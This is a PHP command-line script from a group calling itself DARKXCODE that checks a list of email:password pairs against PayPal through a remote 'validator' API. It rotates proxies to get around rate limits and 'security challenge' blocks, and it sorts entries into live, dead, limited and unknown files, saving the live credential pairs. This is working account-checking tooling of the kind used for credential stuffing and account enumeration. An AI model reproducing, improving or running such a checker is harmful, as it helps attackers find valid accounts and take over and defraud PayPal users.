<?php

// DONT CHANGE THIS
/*==========> INFO 
 * CODE     : BY ZLAXTERT
 * SCRIPT   : PAYPAL VALIDATOR
 * VERSION  : DEMO
 * TELEGRAM : t.me/zlaxtert
 * BY       : DARKXCODE
 */
require_once "function/function.php";
require_once "function/settings.php";


echo banner();
echo banner2();
echo banner3();

enterlist:
echo "$WH [$GR+$WH] Your file ($YL example.txt $WH) $GR>> $BL";
$listname = trim(fgets(STDIN));
if(empty($listname) || !file_exists($listname)) {
    echo PHP_EOL.PHP_EOL."$WH [$YL!$WH] $RD FILE NOT FOUND$WH [$YL!$WH]$DEF".PHP_EOL.PHP_EOL;
    goto enterlist;
}
$lists = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));

$total = count($lists);
$live = 0;
$die = 0;
$limit = 0;
$unknown = 0;
$no = 0;
$total = count($lists);
echo "\n\n$WH [$YL!$WH] TOTAL $GR$total$WH LISTS [$YL!$WH]$DEF\n\n";
foreach ($lists as $list) {
    $no++;
    // GET SETTINGS
if (strtolower($mode_proxy) == "off") {
    $Proxies    = "";
    $proxy_Auth = $proxy_pwd;
    $type_proxy = $proxy_type;
    $apikey     = GetApikey($thisApikey);
    $APIs       = GetApiS($thisApi);
} else {
    $Proxies    = GetProxy($proxy_list);
    $proxy_Auth = $proxy_pwd;
    $type_proxy = $proxy_type;
    $apikey     = GetApikey($thisApikey);
    $APIs       = GetApiS($thisApi);
}
    
    // EXPLODE
    $email = multiexplode(array(":", "|", "/", ";", ""), $list)[0];
    $pass = multiexplode(array(":", "|", "/", ";", ""), $list)[1];

    $email = str_replace("+", "", $email);
    
    $api = $APIs."/validator/paypal/?list=$email&proxy=$Proxies&proxyAuth=$proxy_Auth&type_proxy=$type_proxy&apikey=$apikey";
    // CURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $x = curl_exec($ch);
    curl_close($ch);
    $js  = json_decode($x, TRUE);
    $msg = $js['data']['msg'];
    $type = $js['data']['type'];

    if(strpos($x, '"status":"live"')){
        $live++;
        save_file("result/live.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR LIVE$DEF =>$BL $email$DEF | [$YL TYPE$DEF: $WH$type$DEF ] [$YL MSG$DEF: $GR$msg$DEF ] | BY$CY DARKXCODE$DEF (DEMO)".PHP_EOL;
    }else if (strpos($x, 'SECURITY CHALLENGE!')){
        $limit++;
        save_file("result/limit.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$CY LIMIT$DEF =>$BL $email$DEF | [$YL TYPE$DEF: $WH$type$DEF ] [$YL MSG$DEF:$MG PROXY LIMIT or PROXY REQUIRED$DEF ] | BY$CY DARKXCODE$DEF (DEMO)".PHP_EOL;
    }else if (strpos($x, '"status":"die"')){
        $die++;
        save_file("result/die.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $email$DEF | [$YL TYPE$DEF: $WH$type$DEF ] [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (DEMO)".PHP_EOL;
    }else{
        $unknown++;
        save_file("result/unknown.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$YL UNKNOWN$DEF =>$BL $email$DEF | BY$CY DARKXCODE$DEF (DEMO)".PHP_EOL;
    }

}
//============> END

echo PHP_EOL;
echo "================[DONE]================".PHP_EOL;
echo " DATE          : ".$date.PHP_EOL;
echo " LIVE          : ".$live.PHP_EOL;
echo " DIE           : ".$die.PHP_EOL;
echo " LIMIT         : ".$limit.PHP_EOL;
echo " UNKNOWN       : ".$unknown.PHP_EOL;
echo " TOTAL         : ".$total.PHP_EOL;
echo "======================================".PHP_EOL;
echo "[+] RATIO VALID => $GR".round(RatioCheck($live, $total))."%$DEF".PHP_EOL.PHP_EOL;
echo "[!] NOTE : CHECK AGAIN FILE 'unknown.txt' or 'limit.txt' [!]".PHP_EOL;
echo "This file '".$listname."'".PHP_EOL;
echo "File saved in folder 'result/' ".PHP_EOL.PHP_EOL;


// ==========> FUNCTION

function collorLine($col){
    $data = array(
        "GR" => "\e[32;1m",
        "RD" => "\e[31;1m",
        "BL" => "\e[34;1m",
        "YL" => "\e[33;1m",
        "CY" => "\e[36;1m",
        "MG" => "\e[35;1m",
        "WH" => "\e[37;1m",
        "DEF" => "\e[0m"
    );
    $collor = $data[$col];
    return $collor;
}
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
 
?>
